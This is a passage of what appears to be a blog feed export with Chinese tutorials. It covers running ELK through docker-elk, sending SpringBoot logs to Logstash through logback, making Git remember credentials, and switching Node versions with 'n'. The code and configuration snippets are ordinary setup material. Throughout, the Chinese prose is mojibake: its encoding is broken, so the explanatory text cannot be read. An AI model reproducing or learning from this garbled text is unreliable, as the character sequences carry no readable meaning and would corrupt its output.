<p>ELKä»£è¡¨ï¼šElasticsearchã€Logstashã€Kibana<br>Elasticsearch - å®æ—¶å…¨æ–‡æœç´¢å’Œåˆ†æå¼•æ“ï¼Œæä¾›æœé›†ã€åˆ†æã€å­˜å‚¨æ•°æ®åŠŸèƒ½<br>Logstash - ç”¨æ¥æœé›†ã€åˆ†æã€è¿‡æ»¤æ—¥å¿—çš„å·¥å…·<br>Kibana - Webçš„å›¾å½¢ç•Œé¢ï¼Œç”¨äºæœç´¢ã€åˆ†æå’Œå¯è§†åŒ–å­˜å‚¨åœ¨ ElasticsearchæŒ‡æ ‡ä¸­çš„æ—¥å¿—æ•°æ®</p>
<p>æˆ‘ä»¬ç”¨ä¸ªç®€å•çš„æ¶æ„æ¥æ¼”ç¤ºï¼šELK + SpringBoot</p>
<h4 id="ELKæ—¥å¿—æœåŠ¡æ­å»º"><a href="#ELKæ—¥å¿—æœåŠ¡æ­å»º" class="headerlink" title="ELKæ—¥å¿—æœåŠ¡æ­å»º"></a>ELKæ—¥å¿—æœåŠ¡æ­å»º</h4><p>è¿™é‡Œæˆ‘ä»¬é‡‡ç”¨çš„æ˜¯dockerçš„æ–¹å¼æ¥è¿›è¡Œçš„æ­å»ºï¼Œç›´æ¥åœ¨githubä¸Šæ‰¾äº†ä¸€ä¸ªå¼€æºé¡¹ç›®docker-elkï¼Œå¿«é€Ÿç®€å•çš„å®Œæˆæ­å»ºã€‚</p>
<h5 id="æ„å»ºé•œåƒè¿è¡Œå®¹å™¨"><a href="#æ„å»ºé•œåƒè¿è¡Œå®¹å™¨" class="headerlink" title="æ„å»ºé•œåƒè¿è¡Œå®¹å™¨"></a>æ„å»ºé•œåƒè¿è¡Œå®¹å™¨</h5><p>ä¸‹é¢çš„å‘½ä»¤ç›´æ¥å°±å¯ä»¥æ„å»ºå¹¶è¿è¡Œelkï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;deviantony&#x2F;docker-elk.git</span><br><span class="line">cd docker-elk</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
<p>æ³¨ï¼šå› ä¸ºä»“åº“é‡Œçš„ymlé…ç½®çš„æ˜¯buildå‘½ä»¤ã€‚æ‰€ä»¥æ¯æ¬¡up -déƒ½ä¼šé‡æ–°æ„å»ºé•œåƒï¼Œå› æ­¤ï¼Œæ„å»ºå®Œæˆåï¼Œåç»­å¯åŠ¨å»ºè®®æ—¶é—´startå‘½ä»¤ã€‚</p>
<p>æˆ–è€…ä¹Ÿå¯ä»¥å°†ymlçš„buildå‘½ä»¤ä¿®æ”¹ä¸ºæŒ‡å®šçš„image+ç‰ˆæœ¬ï¼Œå¯ä»¥æ›´å¥½çš„ç®¡ç†å®¹å™¨ç‰ˆæœ¬ï¼Œå¦‚é¡¹ç›®ä¸­çš„docker-stack.ymlæ–‡ä»¶ç¤ºä¾‹ã€‚</p>
<p>å¯åŠ¨å®Œæˆåï¼Œæµè§ˆå™¨æ‰“å¼€ï¼š<a href="http://localhost:5601/">http://localhost:5601/</a> å³å¯è®¿é—®kibanaé¡µé¢ï¼Œé»˜è®¤è´¦å·/å¯†ç ï¼šelastic/changemeã€‚</p>
<p>å¦‚æœéœ€è¦æ¸…ç†å®¹å™¨çš„æŒä¹…æ•°æ®ï¼Œå¯ä»¥æ‰§è¡Œä¸‹é¢çš„å‘½ä»¤ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker-compose down -v</span><br></pre></td></tr></table></figure>
<h5 id="è°ƒæ•´æ ¸å¿ƒé…ç½®"><a href="#è°ƒæ•´æ ¸å¿ƒé…ç½®" class="headerlink" title="è°ƒæ•´æ ¸å¿ƒé…ç½®"></a>è°ƒæ•´æ ¸å¿ƒé…ç½®</h5><p>è¿™äº›è®¾ç½®æ˜¯æ„å»ºé•œåƒçš„æ—¶å€™çš„ä¸€äº›é»˜è®¤è®¾ç½®ï¼Œæ­£å¸¸æƒ…å†µä¸‹ï¼Œä¸éœ€è¦æ›´æ”¹ï¼Œdocker-composeç«¯å£æ˜ å°„å’Œç›¸å…³é…ç½® è¶³ä»¥æ»¡è¶³æˆ‘ä»¬çš„éœ€æ±‚ã€‚</p>
<h6 id="ESé…ç½®"><a href="#ESé…ç½®" class="headerlink" title="ESé…ç½®"></a>ESé…ç½®</h6><p>åœ¨docker-compose.ymlæ–‡ä»¶ä¸­ï¼Œå¯æŒ‡å®šå†…å­˜å¤§å°ã€å¯†ç ã€ä»¥åŠæ¨¡å¼ç­‰ï¼Œå¦‚ï¼š</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">environment:</span></span><br><span class="line">      <span class="attr">ES_JAVA_OPTS:</span> <span class="string">&quot;-Xmx256m -Xms256m&quot;</span></span><br><span class="line">      <span class="attr">ELASTIC_PASSWORD:</span> <span class="string">changeme</span></span><br><span class="line">      <span class="comment"># Use single node discovery in order to disable production mode and avoid bootstrap checks</span></span><br><span class="line">      <span class="comment"># see https://www.elastic.co/guide/en/elasticsearch/reference/current/bootstrap-checks.html</span></span><br><span class="line">      <span class="attr">discovery.type:</span> <span class="string">single-node</span></span><br></pre></td></tr></table></figure>
<h6 id="Logsstashé…ç½®"><a href="#Logsstashé…ç½®" class="headerlink" title="Logsstashé…ç½®"></a>Logsstashé…ç½®</h6><p>æ–‡ä»¶è·¯å¾„ï¼š./logstash/config/logstash.yml<br>é…ç½®å†…å®¹ï¼š</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment">## Default Logstash configuration from Logstash base image.</span></span><br><span class="line"><span class="comment">## https://github.com/elastic/logstash/blob/master/docker/data/logstash/config/logstash-full.yml</span></span><br><span class="line"><span class="attr">http.host:</span> <span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line"><span class="attr">xpack.monitoring.elasticsearch.hosts:</span> [ <span class="string">&quot;http://elasticsearch:9200&quot;</span> ]</span><br><span class="line"></span><br><span class="line"><span class="comment">## X-Pack security credentials</span></span><br><span class="line"><span class="attr">xpack.monitoring.enabled:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">xpack.monitoring.elasticsearch.username:</span> <span class="string">elastic</span></span><br><span class="line"><span class="attr">xpack.monitoring.elasticsearch.password:</span> <span class="string">changeme</span></span><br></pre></td></tr></table></figure>
<p>æ³¨ï¼šè¿™é‡Œéœ€æŒ‡å®šesçš„è®¤è¯å¯†ç ã€åœ°å€å’Œç«¯å£</p>
<p>å¦å¤–ï¼ŒLogsstashè¿˜æœ‰ä¸€ä¸ªæ•°æ®è¾“å…¥ç«¯å£inputè®¾ç½®ï¼š<br>æ–‡ä»¶è·¯å¾„ï¼š./logstash/pipeline/logstash.conf<br>é…ç½®å†…å®¹ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">input &#123;</span><br><span class="line">	tcp &#123;</span><br><span class="line">		port =&gt; 5000</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">output &#123;</span><br><span class="line">	elasticsearch &#123;</span><br><span class="line">		hosts =&gt; <span class="string">&quot;elasticsearch:9200&quot;</span></span><br><span class="line">		user =&gt; <span class="string">&quot;elastic&quot;</span></span><br><span class="line">		password =&gt; <span class="string">&quot;changeme&quot;</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="Kibanaé…ç½®"><a href="#Kibanaé…ç½®" class="headerlink" title="Kibanaé…ç½®"></a>Kibanaé…ç½®</h6><p>æ–‡ä»¶è·¯å¾„ï¼š./kibana/config/kibana.yml<br>é…ç½®å†…å®¹ï¼š</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment">## Default Kibana configuration from Kibana base image.</span></span><br><span class="line"><span class="comment">## https://github.com/elastic/kibana/blob/master/src/dev/build/tasks/os_packages/docker_generator/templates/kibana_yml.template.js</span></span><br><span class="line"><span class="attr">server.name:</span> <span class="string">kibana</span></span><br><span class="line"><span class="attr">server.host:</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line"><span class="attr">elasticsearch.hosts:</span> [ <span class="string">&quot;http://elasticsearch:9200&quot;</span> ]</span><br><span class="line"><span class="attr">monitoring.ui.container.elasticsearch.enabled:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## X-Pack security credentials</span></span><br><span class="line"><span class="attr">elasticsearch.username:</span> <span class="string">elastic</span></span><br><span class="line"><span class="attr">elasticsearch.password:</span> <span class="string">changeme</span></span><br></pre></td></tr></table></figure>
<p>æ³¨ï¼šåŒæ ·çš„ï¼Œè¿™é‡Œä¹Ÿéœ€æŒ‡å®šesçš„è®¤è¯å¯†ç ã€åœ°å€å’Œç«¯å£</p>
<h4 id="SpringBooté¡¹ç›®é…ç½®"><a href="#SpringBooté¡¹ç›®é…ç½®" class="headerlink" title="SpringBooté¡¹ç›®é…ç½®"></a>SpringBooté¡¹ç›®é…ç½®</h4><h5 id="pomæ–‡ä»¶é…ç½®"><a href="#pomæ–‡ä»¶é…ç½®" class="headerlink" title="pomæ–‡ä»¶é…ç½®"></a>pomæ–‡ä»¶é…ç½®</h5><p>å¼•å…¥logstash-logback-encoderï¼Œå®ƒè´Ÿè´£é“¾æ¥logstashæœåŠ¡ï¼Œæ¨é€ç¨‹åºæ—¥å¿—ï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">logstash.version</span>&gt;</span>6.4<span class="tag">&lt;/<span class="name">logstash.version</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>net.logstash.logback<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>logstash-logback-encoder<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;logstash.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>


<h5 id="logback-boot-xmlé…ç½®"><a href="#logback-boot-xmlé…ç½®" class="headerlink" title="logback-boot.xmlé…ç½®"></a>logback-boot.xmlé…ç½®</h5><p>ä¿®æ”¹é¡¹ç›®çš„logback-boot.xmlï¼Œé…ç½®logstashçš„æ—¥å¿—è¿½åŠ å™¨ï¼Œå› ä¸ºæ­¤æ¡ˆä¾‹æ˜¯åœ¨æœ¬åœ°æ­å»ºçš„ï¼Œæ‰€ä»¥logstashçš„åœ°å€ä½¿ç”¨çš„æ˜¯127.0.0.1ï¼Œç«¯å£æ˜¯5000ã€‚</p>
<p>å¦‚æœä¸æ¸…æ¥šç«¯å£ï¼Œå¯ä»¥é€šè¿‡æŸ¥çœ‹docker-composeæ–‡ä»¶æŸ¥çœ‹åˆ° é…ç½®æš´éœ²åœ¨å®¿ä¸»æœºä¸Šçš„ç«¯å£</p>
<p>logback-boot.xmlé…ç½®ç¤ºä¾‹ï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- %mè¾“å‡ºçš„ä¿¡æ¯,%pæ—¥å¿—çº§åˆ«,%tçº¿ç¨‹å,%dæ—¥æœŸ,%cç±»çš„å…¨å,%iç´¢å¼•ã€ä»æ•°å­—0å¼€å§‹é€’å¢ã€‘ --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- appenderæ˜¯configurationçš„å­èŠ‚ç‚¹ï¼Œæ˜¯è´Ÿè´£å†™æ—¥å¿—çš„ç»„ä»¶ã€‚ --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- ConsoleAppenderï¼šæŠŠæ—¥å¿—è¾“å‡ºåˆ°æ§åˆ¶å° --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">&quot;STDOUT&quot;</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.core.ConsoleAppender&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">encoder</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">pattern</span>&gt;</span>%d %p (%file:%line\)- %m%n<span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- æ§åˆ¶å°ä¹Ÿè¦ä½¿ç”¨UTF-8ï¼Œä¸è¦ä½¿ç”¨GBKï¼Œå¦åˆ™ä¼šä¸­æ–‡ä¹±ç  --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">charset</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">charset</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">encoder</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- RollingFileAppenderï¼šæ»šåŠ¨è®°å½•æ–‡ä»¶ï¼Œå…ˆå°†æ—¥å¿—è®°å½•åˆ°æŒ‡å®šæ–‡ä»¶ï¼Œå½“ç¬¦åˆæŸä¸ªæ¡ä»¶æ—¶ï¼Œå°†æ—¥å¿—è®°å½•åˆ°å…¶ä»–æ–‡ä»¶ --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- ä»¥ä¸‹çš„å¤§æ¦‚æ„æ€æ˜¯ï¼š1.å…ˆæŒ‰æ—¥æœŸå­˜æ—¥å¿—ï¼Œæ—¥æœŸå˜äº†ï¼Œå°†å‰ä¸€å¤©çš„æ—¥å¿—æ–‡ä»¶åé‡å‘½åä¸ºXXX%æ—¥æœŸ%ç´¢å¼•ï¼Œæ–°çš„æ—¥å¿—ä»ç„¶æ˜¯demo.log --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--             2.å¦‚æœæ—¥æœŸæ²¡æœ‰å‘ç”Ÿå˜åŒ–ï¼Œä½†æ˜¯å½“å‰æ—¥å¿—çš„æ–‡ä»¶å¤§å°è¶…è¿‡1KBæ—¶ï¼Œå¯¹å½“å‰æ—¥å¿—è¿›è¡Œåˆ†å‰² é‡å‘½å--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">&quot;APILOG&quot;</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.core.rolling.RollingFileAppender&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">File</span>&gt;</span>log/api.log<span class="tag">&lt;/<span class="name">File</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- rollingPolicy:å½“å‘ç”Ÿæ»šåŠ¨æ—¶ï¼Œå†³å®š RollingFileAppender çš„è¡Œä¸ºï¼Œæ¶‰åŠæ–‡ä»¶ç§»åŠ¨å’Œé‡å‘½åã€‚ --&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- TimeBasedRollingPolicyï¼š æœ€å¸¸ç”¨çš„æ»šåŠ¨ç­–ç•¥ï¼Œå®ƒæ ¹æ®æ—¶é—´æ¥åˆ¶å®šæ»šåŠ¨ç­–ç•¥ï¼Œæ—¢è´Ÿè´£æ»šåŠ¨ä¹Ÿè´Ÿè´£å‡ºå‘æ»šåŠ¨ --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">rollingPolicy</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.core.rolling.TimeBasedRollingPolicy&quot;</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- æ´»åŠ¨æ–‡ä»¶çš„åå­—ä¼šæ ¹æ®fileNamePatternçš„å€¼ï¼Œæ¯éš”ä¸€æ®µæ—¶é—´æ”¹å˜ä¸€æ¬¡ --&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- æ–‡ä»¶åï¼šlog/api.2017-12-05.0.log --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">fileNamePattern</span>&gt;</span>log/api.%d.%i.log<span class="tag">&lt;/<span class="name">fileNamePattern</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- æ¯äº§ç”Ÿä¸€ä¸ªæ—¥å¿—æ–‡ä»¶ï¼Œè¯¥æ—¥å¿—æ–‡ä»¶çš„ä¿å­˜æœŸé™ä¸º15å¤© --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">maxHistory</span>&gt;</span>15<span class="tag">&lt;/<span class="name">maxHistory</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">timeBasedFileNamingAndTriggeringPolicy</span>  <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.core.rolling.SizeAndTimeBasedFNATP&quot;</span>&gt;</span></span><br><span class="line">                <span class="comment">&lt;!-- maxFileSize:è¿™æ˜¯æ´»åŠ¨æ–‡ä»¶çš„å¤§å°ï¼Œé»˜è®¤å€¼æ˜¯1MBï¼Œæµ‹è¯•æ—¶å¯æ”¹æˆ1KBçœ‹æ•ˆæœ --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">maxFileSize</span>&gt;</span>1MB<span class="tag">&lt;/<span class="name">maxFileSize</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">timeBasedFileNamingAndTriggeringPolicy</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">rollingPolicy</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">encoder</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- patternèŠ‚ç‚¹ï¼Œç”¨æ¥è®¾ç½®æ—¥å¿—çš„è¾“å…¥æ ¼å¼ --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">pattern</span>&gt;</span></span><br><span class="line">                %d %p (%file:%line\)- %m%n</span><br><span class="line">            <span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- è®°å½•æ—¥å¿—çš„ç¼–ç :æ­¤å¤„è®¾ç½®å­—ç¬¦é›† - --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">charset</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">charset</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">encoder</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">&quot;LOGSTASH&quot;</span> <span class="attr">class</span>=<span class="string">&quot;net.logstash.logback.appender.LogstashTcpSocketAppender&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- logstashåœ°å€ï¼Œç«¯å£æ˜¯logstash.conf inputé…ç½®çš„ç«¯å£ --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">destination</span>&gt;</span>127.0.0.1:5000<span class="tag">&lt;/<span class="name">destination</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">encoder</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> <span class="attr">class</span>=<span class="string">&quot;net.logstash.logback.encoder.LogstashEncoder&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- æ§åˆ¶å°è¾“å‡ºæ—¥å¿—çº§åˆ«, çº§åˆ«ä¾æ¬¡ä¸ºã€ä»é«˜åˆ°ä½ã€‘ï¼šFATAL &gt; ERROR &gt; WARN &gt; INFO &gt; DEBUG &gt; TRACE --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">root</span> <span class="attr">level</span>=<span class="string">&quot;info&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">&quot;STDOUT&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">&quot;APILOG&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">&quot;LOGSTASH&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>ç„¶åï¼Œæˆ‘ä»¬å¯åŠ¨é¡¹ç›®ï¼Œæ—¥å¿—å°±èƒ½å®æ—¶è¿½åŠ åˆ°æ­å»ºçš„æœåŠ¡ä¸­å»äº†ã€‚</p>
<h4 id="Kibanaä»ªè¡¨ç›˜è®¾ç½®"><a href="#Kibanaä»ªè¡¨ç›˜è®¾ç½®" class="headerlink" title="Kibanaä»ªè¡¨ç›˜è®¾ç½®"></a>Kibanaä»ªè¡¨ç›˜è®¾ç½®</h4><p>1ï¼Œç´¢å¼•è®¾ç½®ï¼š<br>è·¯å¾„ï¼šè®¾ç½® &gt;&gt; Kibana &gt;&gt; Index Patterns &gt;&gt; Create index pattern</p>
<p>Step1:<br>ç´¢å¼•ä¿¡æ¯ï¼Œæ”¯æŒæ ¹æ®é€šé…ç¬¦è®¾ç½®ï¼Œå¦‚ï¼šlogstash-*</p>
<p>Step2:<br>é€‰æ‹©æŒ‰ç…§æ—¶æˆ³ä½œä¸ºç­›é€‰å­—æ®µï¼š@timestamp</p>
<p>æ³¨ï¼šä»ªè¡¨ç›˜çš„è¿™äº›ç´¢å¼•è®¾ç½®ï¼Œéœ€è¦æˆ‘ä»¬å…ˆå†™å…¥æ—¥å¿—æ•°æ®</p>
<p>2ï¼Œç„¶åï¼Œè¿›å…¥Discoverä»ªè¡¨ç›˜ï¼Œç„¶åINDEX PATTERNé€‰æ‹©logstash-*ï¼Œå°±èƒ½æŸ¥çœ‹æ—¥å¿—äº†ï¼Œå¦‚ï¼š<br><img src="https://soilove.oss-cn-hangzhou.aliyuncs.com/32e/java/elk.png" alt="ä»ªè¡¨ç›˜"></p>
]]></content>
      <categories>
        <category>docker</category>
        <category>java</category>
      </categories>
      <tags>
        <tag>ELKæ—¥å¿—</tag>
      </tags>
  </entry>
  <entry>
    <title>Gitè®°ä½å¯†ç è®¾ç½®</title>
    <url>/2020/06/15/git-remember-password/</url>
    <content><![CDATA[<h4 id="è®¾ç½®gitè®°ä½å¯†ç "><a href="#è®¾ç½®gitè®°ä½å¯†ç " class="headerlink" title="è®¾ç½®gitè®°ä½å¯†ç "></a>è®¾ç½®gitè®°ä½å¯†ç </h4><p>1ï¼Œè®°ä½å¯†ç è®¾ç½®</p>
<p>è¿›å…¥gitç›®å½•ï¼Œæ‰§è¡Œä¸‹é¢çš„å‘½ä»¤ï¼Œé•¿æœŸä¿å­˜è´¦å·ä¿¡æ¯ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config --global credential.helper store</span><br></pre></td></tr></table></figure>
<p>æˆ–ä¸´æ—¶è®°ä½15åˆ†é’Ÿï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config -â€“global credential.helper cache</span><br></pre></td></tr></table></figure>
<p>æ³¨æ„ï¼šgit configé…ç½®ç”Ÿæ•ˆèŒƒå›´</p>
<table>
<thead>
<tr>
<th>å‚æ•°</th>
<th>æè¿°</th>
<th>çº§åˆ«</th>
</tr>
</thead>
<tbody><tr>
<td><code>--system</code></td>
<td>è¡¨ç¤ºé’ˆå¯¹æ•´ä¸ªç³»ç»Ÿçš„å…¨å±€è®¾ç½®</td>
<td>æœ€å¤§èŒƒå›´</td>
</tr>
<tr>
<td><code>-â€“global</code></td>
<td>è¡¨ç¤ºé’ˆå¯¹å½“å‰è®¡ç®—æœºç™»å½•çš„ç”¨æˆ·çš„å…¨å±€è®¾ç½®</td>
<td>ä¸­ç­‰èŒƒå›´</td>
</tr>
<tr>
<td><code>--local</code></td>
<td>è¡¨ç¤ºé’ˆå¯¹å½“å‰ä»“åº“è®¾ç½®</td>
<td>æœ€å°èŒƒå›´</td>
</tr>
</tbody></table>
<p>2ï¼ŒæŸ¥çœ‹å½“å‰çš„gité…ç½®ä¿¡æ¯</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config -l</span><br></pre></td></tr></table></figure>
<p>è¾“å‡ºå¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">credential.helper&#x3D;osxkeychain</span><br><span class="line">user.name&#x3D;xxxxxxx</span><br><span class="line">user.email&#x3D;xxxx@xxxx.cn</span><br><span class="line">core.autocrlf&#x3D;false</span><br><span class="line">core.repositoryformatversion&#x3D;0</span><br><span class="line">core.filemode&#x3D;true</span><br><span class="line">core.bare&#x3D;false</span><br><span class="line">core.logallrefupdates&#x3D;true</span><br><span class="line">core.ignorecase&#x3D;true</span><br><span class="line">core.precomposeunicode&#x3D;true</span><br><span class="line">remote.origin.url&#x3D;https:&#x2F;&#x2F;github.com&#x2F;soilove4ln&#x2F;xxxx.git</span><br><span class="line">remote.origin.fetch&#x3D;+refs&#x2F;heads&#x2F;*:refs&#x2F;remotes&#x2F;origin&#x2F;*</span><br></pre></td></tr></table></figure>
<p>å¦‚ï¼Œéœ€ä¿®æ”¹å½“å‰ä»“åº“çš„æŸä¸€é¡¹ï¼Œå¯ä½¿ç”¨å¦‚ä¸‹æ–¹å¼ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config --<span class="built_in">local</span> user.name <span class="string">&quot;soilove4ln&quot;</span></span><br></pre></td></tr></table></figure>
<h4 id="æ¸…é™¤è®°ä½å¯†ç çš„è®¾ç½®"><a href="#æ¸…é™¤è®°ä½å¯†ç çš„è®¾ç½®" class="headerlink" title="æ¸…é™¤è®°ä½å¯†ç çš„è®¾ç½®"></a>æ¸…é™¤è®°ä½å¯†ç çš„è®¾ç½®</h4><p>æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config --global --<span class="built_in">unset</span> credential.helper</span><br></pre></td></tr></table></figure>
<p>å¦‚æœä½ éœ€è¦æ¸…é™¤å…¶ä»–å‚æ•°è®¾ç½®ï¼ŒåŒæ ·çš„ï¼Œä½¿ç”¨ä¸Šè¿°æ–¹æ³•å³å¯ã€‚</p>
]]></content>
      <categories>
        <category>git</category>
      </categories>
      <tags>
        <tag>git</tag>
        <tag>å…å¯†</tag>
      </tags>
  </entry>
  <entry>
    <title>nodeç‰ˆæœ¬ç®¡ç†å·¥å…·â€nâ€œçš„ä½¿ç”¨</title>
    <url>/2020/06/28/install-n/</url>
    <content><![CDATA[<h4 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h4><p>æˆ‘ä½¿ç”¨çš„æ˜¯macç”µè„‘ï¼Œæ‰€ä»¥å¯ç›´æ¥ç”¨brewå®‰è£…ï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">brew install n</span><br></pre></td></tr></table></figure>
<p>å®‰è£…å®Œæˆåï¼Œå¯ä»¥é€šè¿‡<code>n --help</code>æŸ¥çœ‹å‘½ä»¤å¸®åŠ©ã€‚</p>
<h4 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h4><p>1ï¼ŒæŸ¥çœ‹æ‰€æœ‰å¯ä¾›å®‰è£…çš„nodeç‰ˆæœ¬</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">n ls-remote --all</span><br></pre></td></tr></table></figure>
<p>2ï¼Œé€‰æ‹©ç‰ˆæœ¬å®‰è£…</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo n ç‰ˆæœ¬</span><br></pre></td></tr></table></figure>
<p>3ï¼ŒæŸ¥çœ‹å·²ç»å®‰è£…çš„ç‰ˆæœ¬</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">n ls</span><br></pre></td></tr></table></figure>
<p>4ï¼Œåˆ‡æ¢ç‰ˆæœ¬ï¼Œä½¿ç”¨ä½¿ç”¨<code>n</code>å‘½ä»¤ï¼Œç„¶åä½¿ç”¨<code>ä¸Š/ä¸‹</code>é”®é€‰æ‹©ç‰ˆæœ¬ï¼Œå›è½¦å³å¯</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo n</span><br></pre></td></tr></table></figure>
<p>5ï¼ŒæŸ¥çœ‹å½“å‰ä½¿ç”¨çš„nodeç‰ˆæœ¬</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">node -v</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>node</tag>
        <tag>ç‰ˆæœ¬ç®¡ç†</tag>
      </tags>
  </entry>
  <entry>
    <title>Centoså®‰è£…ä¸­æ–‡å­—ä½“</title>
    <url>/2020/09/15/linux-fonts/</url>
